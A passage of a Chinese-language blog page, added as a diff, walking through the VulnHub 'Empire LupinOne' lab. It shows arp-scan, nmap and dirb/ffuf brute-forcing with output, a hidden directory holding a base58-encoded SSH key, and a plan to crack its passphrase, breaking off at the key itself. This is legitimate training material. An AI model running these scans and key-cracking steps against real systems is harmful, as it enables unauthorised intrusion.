@@ -1,0 +1,722 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fuming">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="LupinOne靶机地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;empire-lupinone,750&#x2F; 信息收集主机发现12345678910111213┌──(root㉿kali)-[&#x2F;home&#x2F;kali]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:99:90:c7, IPv4: 192.168.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Empire_lupinone">
+<meta property="og:url" content="https://fuyoumingyan.github.io/2023/05/29/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/empire-lupinone/index.html">
+<meta property="og:site_name" content="fuyoumingyan&#39;s blog">
+<meta property="og:description" content="LupinOne靶机地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;empire-lupinone,750&#x2F; 信息收集主机发现12345678910111213┌──(root㉿kali)-[&#x2F;home&#x2F;kali]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:99:90:c7, IPv4: 192.168.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415151014511.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415151438465.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415152604264.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415153900719.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415154822031.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415160005557.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415161213520.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415161225632.png">
+<meta property="article:published_time" content="2023-05-29T04:59:28.000Z">
+<meta property="article:modified_time" content="2023-05-29T05:00:34.000Z">
+<meta property="article:author" content="fuming">
+<meta property="article:tag" content="靶机渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415151014511.png">
+  
+  
+  
+  <title>Empire_lupinone - fuyoumingyan&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fuyoumingyan.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fuyoumingyan&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Empire_lupinone"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-05-29 12:59" pubdate>
+          2023年5月29日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          88 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Empire_lupinone</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="LupinOne"><a href="#LupinOne" class="headerlink" title="LupinOne"></a>LupinOne</h1><p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/empire-lupinone,750/">https://www.vulnhub.com/entry/empire-lupinone,750/</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># arp-scan -l</span><br>Interface: eth0, <span class="hljs-built_in">type</span>: EN10MB, MAC: 00:0c:29:99:90:c7, IPv4: 192.168.222.128<br>WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied<br>WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied<br>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.222.1   00:50:56:c0:00:08       (Unknown)<br>192.168.222.2   00:50:56:ec:db:c2       (Unknown)<br>192.168.222.131 00:0c:29:94:0f:6c       (Unknown)<br>192.168.222.254 00:50:56:e0:43:d1       (Unknown)<br><br>4 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.10.0: 256 hosts scanned <span class="hljs-keyword">in</span> 2.015 seconds (127.05 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure>
+
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># nmap -A -p- -T 5 192.168.222.131</span><br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 03:06 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.222.131<br>Host is up (0.00072s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 edead9d3af199c8e4e0f31dbf25d1279 (RSA)<br>|   256 bf9fa993c58721a36b6f9ee68761f519 (ECDSA)<br>|_  256 ac18eccc35c051f56f4774c30195b40f (ED25519)<br>80/tcp open  http    Apache httpd 2.4.48 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">| http-robots.txt: 1 disallowed entry </span><br><span class="hljs-string">|_/~myfiles</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.48 (Debian)</span><br><span class="hljs-string">MAC Address: 00:0C:29:94:0F:6C (VMware)</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.6</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">TRACEROUTE</span><br><span class="hljs-string">HOP RTT     ADDRESS</span><br><span class="hljs-string">1   0.72 ms 192.168.222.131</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds                                                                                                   </span><br></code></pre></td></tr></table></figure>
+
+<p>SSH 、HTTP</p>
+<p>robots.txt -&gt; &#x2F;~myfiles</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.222.131/~myfiles/">http://192.168.222.131/~myfiles/</a></p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415151014511.png" srcset="/img/loading.gif" lazyload alt="image-20230415151014511"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.222.131/">http://192.168.222.131/</a>~ 可以尝试进行目录爆破</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># dirb http://192.168.222.131/</span><br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sat Apr 15 03:07:57 2023<br>URL_BASE: http://192.168.222.131/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.222.131/ ----<br>==&gt; DIRECTORY: http://192.168.222.131/image/                                                                                                                   <br>+ http://192.168.222.131/index.html (CODE:200|SIZE:333)                                                                                                        <br>==&gt; DIRECTORY: http://192.168.222.131/javascript/                                                                                                              <br>==&gt; DIRECTORY: http://192.168.222.131/manual/                                                                                                                  <br>+ http://192.168.222.131/robots.txt (CODE:200|SIZE:34)                                                                                                         <br>+ http://192.168.222.131/server-status (CODE:403|SIZE:280)                                                                                                     <br>                                                                                                                                                               <br>---- Entering directory: http://192.168.222.131/image/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                                                               <br>---- Entering directory: http://192.168.222.131/javascript/ ----<br>==&gt; DIRECTORY: http://192.168.222.131/javascript/jquery/                                                                                                       <br>                                                                                                                                                               <br>---- Entering directory: http://192.168.222.131/manual/ ----<br>==&gt; DIRECTORY: http://192.168.222.131/manual/da/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/de/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/en/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/es/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/fr/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/images/                                                                                                           <br>+ http://192.168.222.131/manual/index.html (CODE:200|SIZE:676)                                                                                                 <br>==&gt; DIRECTORY: http://192.168.222.131/manual/ja/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/ko/                                                                                                               <br>==&gt; DIRECTORY: http://192.168.222.131/manual/ru/  <br><br>...<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># ffuf -w /usr/share/dirb/wordlists/common.txt -u http://192.168.222.131/~FUZZ  -c -v       </span><br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.0.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://192.168.222.131/~FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 5ms]</span><br><span class="hljs-string">| URL | http://192.168.222.131/~secret</span><br><span class="hljs-string">| --&gt; | http://192.168.222.131/~secret/</span><br><span class="hljs-string">    * FUZZ: secret</span><br><span class="hljs-string"></span><br><span class="hljs-string">:: Progress: [4614/4614] :: Job [1/1] :: 3921 req/sec :: Duration: [0:00:01] :: Errors: 0 ::</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415151438465.png" srcset="/img/loading.gif" lazyload alt="image-20230415151438465"></p>
+<p>ssh 秘钥<strong>隐藏</strong>在这个秘密目录下，找到 ssh 秘钥文件 然后使用 fasttrack 破解秘钥密码。</p>
+<p>用户名 icex64</p>
+<p>目录爆破字典：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># wordlists</span><br><br>&gt; wordlists ~ Contains the rockyou wordlist<br><br>/usr/share/wordlists<br>├── amass -&gt; /usr/share/amass/wordlists<br>├── dirb -&gt; /usr/share/dirb/wordlists<br>├── dirbuster -&gt; /usr/share/dirbuster/wordlists<br>├── fasttrack.txt -&gt; /usr/share/set/src/fasttrack/wordlist.txt<br>├── fern-wifi -&gt; /usr/share/fern-wifi-cracker/extras/wordlists<br>├── john.lst -&gt; /usr/share/john/password.lst<br>├── legion -&gt; /usr/share/legion/wordlists<br>├── metasploit -&gt; /usr/share/metasploit-framework/data/wordlists<br>├── nmap.lst -&gt; /usr/share/nmap/nselib/data/passwords.lst<br>├── rockyou.txt.gz<br>├── sqlmap.txt -&gt; /usr/share/sqlmap/data/txt/wordlist.txt<br>├── wfuzz -&gt; /usr/share/wfuzz/wordlist<br>└── wifite.txt -&gt; /usr/share/dict/wordlist-probable.txt<br><br>┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># ll /usr/share/dirb/wordlists /usr/share/dirbuster/wordlists</span><br>/usr/share/dirbuster/wordlists:<br>total 7584<br>-rw-r--r-- 1 root root   71638 Feb 27  2009 apache-user-enum-1.0.txt<br>-rw-r--r-- 1 root root   90418 Feb 27  2009 apache-user-enum-2.0.txt<br>-rw-r--r-- 1 root root  546618 Feb 27  2009 directories.jbrofuzz<br>-rw-r--r-- 1 root root 1802668 Feb 27  2009 directory-list-1.0.txt<br>-rw-r--r-- 1 root root 1980043 Feb 27  2009 directory-list-2.3-medium.txt<br>-rw-r--r-- 1 root root  725439 Feb 27  2009 directory-list-2.3-small.txt<br>-rw-r--r-- 1 root root 1849676 Feb 27  2009 directory-list-lowercase-2.3-medium.txt<br>-rw-r--r-- 1 root root  676768 Feb 27  2009 directory-list-lowercase-2.3-small.txt<br><br>/usr/share/dirb/wordlists:<br>total 260<br>-rw-r--r-- 1 root root 184073 Jan 24  2012 big.txt<br>-rw-r--r-- 1 root root   1292 Jan 27  2012 catala.txt<br>-rw-r--r-- 1 root root  35849 Nov 17  2014 common.txt<br>-rw-r--r-- 1 root root   1492 May 23  2012 euskera.txt<br>-rw-r--r-- 1 root root    142 Dec 29  2005 extensions_common.txt<br>-rw-r--r-- 1 root root     75 Mar 16  2012 indexes.txt<br>-rw-r--r-- 1 root root    244 Dec 29  2005 mutations_common.txt<br>drwxr-xr-x 2 root root   4096 Mar 10 08:47 others<br>-rw-r--r-- 1 root root   6561 Mar  4  2014 small.txt<br>-rw-r--r-- 1 root root   3731 Nov 12  2014 spanish.txt<br>drwxr-xr-x 2 root root   4096 Mar 10 08:47 stress<br>drwxr-xr-x 2 root root   4096 Mar 10 08:47 vulns<br>                                                                 <br></code></pre></td></tr></table></figure>
+
+<p>使用两个目录字典中最大的进行爆破：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─<span class="hljs-comment"># ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.222.131/~secret/.FUZZ -e .txt -c -mc 200     </span><br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.0.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://192.168.222.131/~secret/.FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class="hljs-string"> :: Extensions       : .txt </span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">...</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Status: 200, Size: 4689, Words: 1, Lines: 2, Duration: 12ms]</span><br><span class="hljs-string">    * FUZZ: mysecret.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">...</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230415152604264.png" srcset="/img/loading.gif" lazyload alt="image-20230415152604264"></p>
+<p>字母大小写 + 数字 可能是 base 系列</p>
+<p>末尾没有 &#x3D; ，base58</p>
+<p>也可以使用网站去识别编码方式：<a target="_blank" rel="noopener" href="https://www.dcode.fr/cipher-identifier">https://www.dcode.fr/cipher-identifier</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/convert/base58">https://www.lddgo.net/convert/base58</a></p>
+<p>解码后如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE 